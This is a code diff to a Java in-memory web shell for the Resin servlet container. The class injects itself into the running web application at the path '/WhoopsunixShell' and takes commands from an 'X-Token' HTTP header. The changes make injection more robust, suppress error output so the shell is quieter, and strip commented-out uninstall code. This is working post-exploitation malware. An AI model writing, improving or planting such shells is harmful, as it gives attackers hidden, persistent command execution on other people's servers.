@@ -19,11 +19,11 @@ import java.util.HashMap;
 public class ResinServletExecMS implements Servlet {
     private static String NAME = "Whoopsunix";
     private static String PATTERN = "/WhoopsunixShell";
-    private static String header = "X-Token";
+    private static String HEADER = "X-Token";
 
     static {
         try {
-            ResinServletExecMS resinListenerExecMS = new ResinServletExecMS();
+            ResinServletExecMS resinServletExecMS = new ResinServletExecMS();
 
             Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
             for (int i = 0; i < threads.length; i++) {
@@ -31,12 +31,15 @@ public class ResinServletExecMS implements Servlet {
                     Class cls = threads[i].currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
                     Object contextRequest = cls.getMethod("getContextRequest").invoke(null);
                     Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
+                    if (webapp == null){
+                        continue;
+                    }
 
-                    if (isInject(webapp, resinListenerExecMS)) {
+                    if (isInject(webapp, resinServletExecMS)) {
                         break;
                     }
 
-                    inject(webapp, resinListenerExecMS);
+                    inject(webapp, resinServletExecMS);
                 } catch (Exception e) {}
             }
         } catch (Exception e) {
@@ -46,7 +49,7 @@ public class ResinServletExecMS implements Servlet {
     public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
-            String cmd = httpServletRequest.getHeader(header);
+            String cmd = httpServletRequest.getHeader(HEADER);
             if (cmd == null) {
                 return;
             }
@@ -77,7 +80,7 @@ public class ResinServletExecMS implements Servlet {
 
 
         } catch (Exception e) {
-            e.printStackTrace();
+            
         }
     }
 
@@ -89,29 +92,6 @@ public class ResinServletExecMS implements Servlet {
             if (_servlets.containsKey(name)) {
                 return true;
             }
-
-            // 卸载
-//            String NAME = (String) getFieldValue(object, "NAME");
-//            String pattern = (String) getFieldValue(object, "pattern");
-//
-//            Object _servletManager = getFieldValue(webapp, "_servletManager");
-//            HashMap _servlets = (HashMap) getFieldValue(_servletManager, "_servlets");
-//            ArrayList _servletList = (ArrayList) getFieldValue(_servletManager, "_servletList");
-//            System.out.println(_servletList);
-//            for (int j = 0; j < _servletList.size(); ++j) {
-//                String _servletName = (String) getFieldValue(_servletList.get(j), "_servletName");
-//                String _servletNameDefault = (String) getFieldValue(_servletList.get(j), "_servletNameDefault");
-//
-//                if (_servletName.equals(NAME) && _servletNameDefault.equals(pattern)) {
-//                    System.out.println("find in _servletList");
-//                }
-//            }
-//
-//            if (_servlets.containsKey(NAME)){
-//                System.out.println("find in _servlets");
-//            }
-
-
         } catch (Exception e) {
 
         }
@@ -202,7 +182,7 @@ public class ResinServletExecMS implements Servlet {
             method.setAccessible(true);
             method.invoke(obj, args);
         } catch (Exception e) {
-            e.printStackTrace();
+            
         }
     }
 }
